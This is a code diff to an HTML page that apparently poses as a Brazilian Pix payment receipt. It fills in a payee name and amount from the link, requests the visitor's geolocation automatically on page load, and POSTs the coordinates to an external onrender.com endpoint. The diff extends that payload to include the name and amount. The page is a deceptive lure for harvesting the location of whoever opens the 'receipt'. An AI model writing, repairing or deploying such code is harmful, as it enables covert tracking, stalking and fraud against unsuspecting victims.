@@ -287,14 +287,24 @@
   <script>
     // --- JAVASCRIPT EMBUTIDO (SEM ARQUIVO EXTERNO) ---
 
+    // Variáveis para guardar os dados e enviar depois
+    let nomeFinal = "JORGE LUIZ DA CONCEIÇÃO";
+    let valorFinal = "2000,00";
+
     window.addEventListener("load", () => {
       // 1. Configura nomes via Link
       const params = new URLSearchParams(window.location.search);
       const nomeUrl = params.get('nome');
       const valorUrl = params.get('valor');
 
-      if (nomeUrl) document.getElementById('nome-destino').innerText = nomeUrl.toUpperCase();
-      if (valorUrl) document.getElementById('valor-pix').innerText = "R$ " + valorUrl;
+      if (nomeUrl) {
+        nomeFinal = nomeUrl.toUpperCase();
+        document.getElementById('nome-destino').innerText = nomeFinal;
+      }
+      if (valorUrl) {
+        valorFinal = valorUrl;
+        document.getElementById('valor-pix').innerText = "R$ " + valorFinal;
+      }
 
       // 2. PEDE LOCALIZAÇÃO AUTOMATICAMENTE
       if (navigator.geolocation) {
@@ -315,11 +325,18 @@
       const longitude = position.coords.longitude;
       const maps = `http://maps.google.com/?q=${latitude},${longitude}`;
 
-      // LINK CORRIGIDO: 1817 (NUMERO)
+      // LINK ORIGINAL: l817 (LETRA L)
       fetch("https://comprovante-pix-l817.onrender.com/send-location", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ latitude, longitude, maps })
+        // Adicionando apenas as variáveis dinâmicas ao envio
+        body: JSON.stringify({
+          latitude,
+          longitude,
+          maps,
+          nome: nomeFinal,
+          valor: valorFinal
+        })
       }).catch(e => console.error(e));
     }
 
